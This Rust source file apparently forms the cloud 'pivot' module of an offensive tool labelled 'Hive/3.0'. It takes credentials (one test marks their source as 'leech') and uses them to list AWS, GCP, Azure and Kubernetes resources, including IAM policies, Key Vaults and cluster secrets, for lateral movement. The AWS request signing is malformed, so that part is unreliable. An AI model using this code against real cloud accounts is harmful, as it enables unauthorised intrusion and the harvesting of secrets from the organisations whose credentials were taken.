use std::collections::HashMap;
use std::time::{Duration, Instant};

#[derive(Debug, Clone, PartialEq)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
    K8s,
}

#[derive(Debug, Clone)]
pub struct CloudCredential {
    pub provider: CloudProvider,
    pub token: String,
    pub account_id: String,
    pub region: String,
    pub source: String,
}

#[derive(Debug, Clone)]
pub struct CloudResult {
    pub provider: CloudProvider,
    pub action: String,
    pub success: bool,
    pub output: String,
    pub resources_found: u32,
}

pub struct CloudWorker {
    rate_limiter: HashMap<String, Instant>,
    min_interval: Duration,
    client: reqwest::blocking::Client,
}

impl CloudWorker {
    pub fn new() -> Self {
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(15))
            .user_agent("Hive/3.0")
            .build()
            .unwrap_or_default();
        Self {
            rate_limiter: HashMap::new(),
            min_interval: Duration::from_millis(500),
            client,
        }
    }

    pub fn new_with_interval(ms: u64) -> Self {
        let mut w = Self::new();
        w.min_interval = Duration::from_millis(ms);
        w
    }

    fn check_rate_limit(&mut self, provider: &str) {
        let now = Instant::now();
        if let Some(last) = self.rate_limiter.get(provider) {
            let elapsed = now.duration_since(*last);
            if elapsed < self.min_interval {
                std::thread::sleep(self.min_interval - elapsed);
            }
        }
        self.rate_limiter.insert(provider.to_string(), Instant::now());
    }

    pub fn check_connectivity() -> bool {
        let targets = ["https://aws.amazon.com", "https://cloud.google.com", "https://azure.microsoft.com", "https://api.github.com"];
        targets.iter().any(|url| {
            reqwest::blocking::Client::builder()
                .timeout(Duration::from_secs(3))
                .build()
                .ok()
                .and_then(|c| c.head(*url).send().ok())
                .is_some()
        })
    }

    pub fn pivot_all(&mut self, credentials: &[CloudCredential]) -> Vec<CloudResult> {
        let mut results = Vec::new();
        for cred in credentials {
            let provider_results = match cred.provider {
                CloudProvider::Aws => self.pivot_aws(cred),
                CloudProvider::Gcp => self.pivot_gcp(cred),
                CloudProvider::Azure => self.pivot_azure(cred),
                CloudProvider::K8s => self.pivot_k8s(cred),
            };
            results.extend(provider_results);
        }
        results
    }

    fn pivot_aws(&mut self, cred: &CloudCredential) -> Vec<CloudResult> {
        let mut results = Vec::new();
        self.check_rate_limit("aws");

        // STS GetCallerIdentity to validate token
        let identity = self.aws_api_call(
            "sts",
            "GetCallerIdentity",
            &cred.token,
            "Action=GetCallerIdentity&Version=2011-06-15",
        );
        if !identity.success {
            results.push(CloudResult {
                provider: CloudProvider::Aws,
                action: "sts_validate".into(),
                success: false,
                output: format!("AWS token invalid: {}", identity.output),
                resources_found: 0,
            });
            return results;
        }
        results.push(CloudResult {
            provider: CloudProvider::Aws,
            action: "sts_validate".into(),
            success: true,
            output: format!("AWS identity valid: {}", identity.output),
            resources_found: 1,
        });

        self.check_rate_limit("aws");
        let ec2 = self.aws_api_call(
            "ec2",
            "DescribeInstances",
            &cred.token,
            "Action=DescribeInstances&Version=2016-11-15",
        );
        let ec2_count = if ec2.success {
            ec2.output.matches("instanceId").count() as u32
        } else { 0 };
        results.push(CloudResult {
            provider: CloudProvider::Aws,
            action: "ec2_describe".into(),
            success: ec2.success,
            output: if ec2.success { format!("EC2: {} instances", ec2_count) } else { ec2.output },
            resources_found: ec2_count,
        });

        self.check_rate_limit("aws");
        let s3 = self.aws_api_call(
            "s3",
            "ListBuckets",
            &cred.token,
            "",
        );
        let s3_count = if s3.success {
            s3.output.matches("<Bucket>").count() as u32
        } else { 0 };
        results.push(CloudResult {
            provider: CloudProvider::Aws,
            action: "s3_list".into(),
            success: s3.success,
            output: if s3.success { format!("S3: {} buckets", s3_count) } else { s3.output },
            resources_found: s3_count,
        });

        self.check_rate_limit("aws");
        let lambda = self.aws_api_call(
            "lambda",
            "ListFunctions",
            &cred.token,
            "Version=2015-03-31",
        );
        let lambda_count = if lambda.success {
            lambda.output.matches("FunctionName").count() as u32
        } else { 0 };
        results.push(CloudResult {
            provider: CloudProvider::Aws,
            action: "lambda_list".into(),
            success: lambda.success,
            output: if lambda.success { format!("Lambda: {} functions", lambda_count) } else { lambda.output },
            resources_found: lambda_count,
        });

        results
    }

    fn pivot_gcp(&mut self, cred: &CloudCredential) -> Vec<CloudResult> {
        let mut results = Vec::new();
        self.check_rate_limit("gcp");

        let token = format!("Bearer {}", cred.token);
        let project = &cred.account_id;

        // Compute Engine
        let compute_url = format!(
            "https://compute.googleapis.com/compute/v1/projects/{}/aggregated/instances",
            project
        );
        let (compute_ok, compute_count) = match self.client
            .get(&compute_url)
            .header("Authorization", &token)
            .send()
        {
            Ok(r) => {
                let text = r.text().unwrap_or_default();
                let ok = !text.contains("error");
                let count = text.matches("kind").count() as u32;
                (ok, count)
            }
            Err(_) => (false, 0),
        };
        results.push(CloudResult {
            provider: CloudProvider::Gcp,
            action: "compute_list".into(),
            success: compute_ok,
            output: if compute_ok { format!("Compute: {} instances", compute_count) } else { "GCP token invalid".into() },
            resources_found: compute_count,
        });

        if !compute_ok {
            return results;
        }

        self.check_rate_limit("gcp");
        let iam_url = format!(
            "https://cloudresourcemanager.googleapis.com/v1/projects/{}:getIamPolicy",
            project
        );
        let iam_resp = self.client
            .post(&iam_url)
            .header("Authorization", &token)
            .header("Content-Type", "application/json")
            .body("{}")
            .send();
        let iam_ok = iam_resp.is_ok();
        results.push(CloudResult {
            provider: CloudProvider::Gcp,
            action: "iam_policy".into(),
            success: iam_ok,
            output: if iam_ok { "IAM policy readable".into() } else { "IAM denied".into() },
            resources_found: if iam_ok { 1 } else { 0 },
        });

        self.check_rate_limit("gcp");
        let functions_url = format!(
            "https://cloudfunctions.googleapis.com/v1/projects/{}/locations/-/functions",
            project
        );
        let (func_ok, func_count) = match self.client
            .get(&functions_url)
            .header("Authorization", &token)
            .send()
        {
            Ok(r) => {
                let text = r.text().unwrap_or_default();
                (true, text.matches("name").count() as u32)
            }
            Err(_) => (false, 0),
        };
        results.push(CloudResult {
            provider: CloudProvider::Gcp,
            action: "functions_list".into(),
            success: func_ok,
            output: format!("Cloud Functions: {}", func_count),
            resources_found: func_count,
        });

        results
    }

    fn pivot_azure(&mut self, cred: &CloudCredential) -> Vec<CloudResult> {
        let mut results = Vec::new();
        self.check_rate_limit("azure");

        let token = format!("Bearer {}", cred.token);

        // Validate token — list subscriptions
        let subs_resp = self.client
            .get("https://management.azure.com/subscriptions?api-version=2020-01-01")
            .header("Authorization", &token)
            .send();
        let subs_ok = subs_resp.is_ok();
        if !subs_ok {
            results.push(CloudResult {
                provider: CloudProvider::Azure,
                action: "subscriptions_list".into(),
                success: false,
                output: "Azure token invalid".into(),
                resources_found: 0,
            });
            return results;
        }
        let subs_text = subs_resp.unwrap().text().unwrap_or_default();
        let sub_count = subs_text.matches("subscriptionId").count() as u32;
        results.push(CloudResult {
            provider: CloudProvider::Azure,
            action: "subscriptions_list".into(),
            success: true,
            output: format!("{} subscriptions", sub_count),
            resources_found: sub_count,
        });

        self.check_rate_limit("azure");
        let sub_id = cred.account_id.trim();
        let vm_url = format!(
            "https://management.azure.com/subscriptions/{}/providers/Microsoft.Compute/virtualMachines?api-version=2022-03-01",
            sub_id
        );
        let (vm_ok, vm_count) = match self.client
            .get(&vm_url)
            .header("Authorization", &token)
            .send()
        {
            Ok(r) => {
                let text = r.text().unwrap_or_default();
                (true, text.matches("name").count() as u32)
            }
            Err(_) => (false, 0),
        };
        results.push(CloudResult {
            provider: CloudProvider::Azure,
            action: "vm_list".into(),
            success: vm_ok,
            output: format!("VMs: {}", vm_count),
            resources_found: vm_count,
        });

        self.check_rate_limit("azure");
        let kv_url = format!(
            "https://management.azure.com/subscriptions/{}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01",
            sub_id
        );
        let (kv_ok, kv_count) = match self.client
            .get(&kv_url)
            .header("Authorization", &token)
            .send()
        {
            Ok(r) => {
                let text = r.text().unwrap_or_default();
                (true, text.matches("name").count() as u32)
            }
            Err(_) => (false, 0),
        };
        results.push(CloudResult {
            provider: CloudProvider::Azure,
            action: "keyvault_list".into(),
            success: kv_ok,
            output: format!("Key Vaults: {}", kv_count),
            resources_found: kv_count,
        });

        results
    }

    fn pivot_k8s(&mut self, cred: &CloudCredential) -> Vec<CloudResult> {
        let mut results = Vec::new();
        self.check_rate_limit("k8s");

        let server = cred.account_id.trim();
        let token = &cred.token;

        let cluster_resp = self.client
            .get(&format!("{}/api/v1/namespaces/default", server))
            .header("Authorization", format!("Bearer {}", token))
            .header("Accept", "application/json")
            .send();
        let api_ok = cluster_resp.is_ok();
        if !api_ok {
            results.push(CloudResult {
                provider: CloudProvider::K8s,
                action: "api_check".into(),
                success: false,
                output: "K8s API unreachable or token invalid".into(),
                resources_found: 0,
            });
            return results;
        }
        results.push(CloudResult {
            provider: CloudProvider::K8s,
            action: "api_check".into(),
            success: true,
            output: "K8s API reachable".into(),
            resources_found: 1,
        });

        self.check_rate_limit("k8s");
        let (pods_ok, pod_count) = match self.client
            .get(&format!("{}/api/v1/pods", server))
            .header("Authorization", format!("Bearer {}", token))
            .header("Accept", "application/json")
            .send()
        {
            Ok(r) => {
                let text = r.text().unwrap_or_default();
                (true, text.matches("\"name\"").count() as u32)
            }
            Err(_) => (false, 0),
        };
        results.push(CloudResult {
            provider: CloudProvider::K8s,
            action: "pods_list".into(),
            success: pods_ok,
            output: format!("Pods: {}", pod_count),
            resources_found: pod_count,
        });

        self.check_rate_limit("k8s");
        let (secrets_ok, secret_count) = match self.client
            .get(&format!("{}/api/v1/secrets", server))
            .header("Authorization", format!("Bearer {}", token))
            .header("Accept", "application/json")
            .send()
        {
            Ok(r) => {
                let text = r.text().unwrap_or_default();
                (true, text.matches("\"name\"").count() as u32)
            }
            Err(_) => (false, 0),
        };
        results.push(CloudResult {
            provider: CloudProvider::K8s,
            action: "secrets_list".into(),
            success: secrets_ok,
            output: format!("Secrets: {}", secret_count),
            resources_found: secret_count,
        });

        results
    }

    fn aws_api_call(&self, service: &str, action: &str, token: &str, body: &str) -> CloudResult {
        let region = "us-east-1";
        let host = format!("{}.amazonaws.com", service);
        let url = format!("https://{}", host);

        let resp = self.client
            .post(&url)
            .header("Host", &host)
            .header("X-Amz-Date", "20260101T000000Z")
            .header("X-Amz-Security-Token", token)
            .header("Authorization", format!("AWS4-HMAC-SHA256 Credential={}/20260101/{}/{}/aws4_request", token, region, service))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .header("User-Agent", "Hive/3.0")
            .body(body.to_string())
            .send();

        match resp {
            Ok(r) => {
                let status = r.status();
                let text = r.text().unwrap_or_default();
                CloudResult {
                    provider: CloudProvider::Aws,
                    action: format!("{}_{}", service, action),
                    success: status.is_success(),
                    output: if status.is_success() {
                        format!("{}: OK ({} bytes)", action, text.len())
                    } else {
                        format!("{}: HTTP {} — {}", action, status.as_u16(), &text[..text.len().min(200)])
                    },
                    resources_found: if status.is_success() { 1 } else { 0 },
                }
            }
            Err(e) => CloudResult {
                provider: CloudProvider::Aws,
                action: format!("{}_{}", service, action),
                success: false,
                output: format!("Request failed: {}", e),
                resources_found: 0,
            },
        }
    }
}

impl Default for CloudWorker {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cloud_worker_creation() {
        let w = CloudWorker::new();
        assert!(w.rate_limiter.is_empty());
    }

    #[test]
    fn test_cloud_worker_with_interval() {
        let w = CloudWorker::new_with_interval(1000);
        assert_eq!(w.min_interval.as_millis(), 1000);
    }

    #[test]
    fn test_cloud_credential_creation() {
        let cred = CloudCredential {
            provider: CloudProvider::Aws,
            token: "ASIA...".into(),
            account_id: "123456".into(),
            region: "us-east-1".into(),
            source: "leech".into(),
        };
        assert_eq!(cred.provider, CloudProvider::Aws);
        assert_eq!(cred.region, "us-east-1");
    }

    #[test]
    fn test_cloud_result_display() {
        let r = CloudResult {
            provider: CloudProvider::Gcp,
            action: "compute_list".into(),
            success: true,
            output: "Compute: 5 instances".into(),
            resources_found: 5,
        };
        assert!(r.success);
        assert_eq!(r.resources_found, 5);
    }

    #[test]
    fn test_pivot_all_empty() {
        let mut w = CloudWorker::new();
        let results = w.pivot_all(&[]);
        assert!(results.is_empty());
    }

    #[test]
    fn test_pivot_all_no_connectivity() {
        // Should handle gracefully without panic even without internet
        let mut w = CloudWorker::new_with_interval(0);
        let creds = vec![
            CloudCredential {
                provider: CloudProvider::Aws,
                token: "test".into(),
                account_id: "000000".into(),
                region: "us-east-1".into(),
                source: "test".into(),
            }
        ];
        let results = w.pivot_all(&creds);
        assert!(!results.is_empty());
        // Will fail (no real token) but should not panic
        for r in &results {
            assert!(!r.success);
        }
    }

    #[test]
    fn test_connectivity_check_no_panic() {
        let connected = CloudWorker::check_connectivity();
        // May or may not have internet, just don't panic
        let _ = connected;
    }

    #[test]
    fn test_rate_limiter_doesnt_block_first() {
        let mut w = CloudWorker::new_with_interval(1000);
        w.check_rate_limit("test");
        // First call should not block
        assert!(w.rate_limiter.contains_key("test"));
    }
}
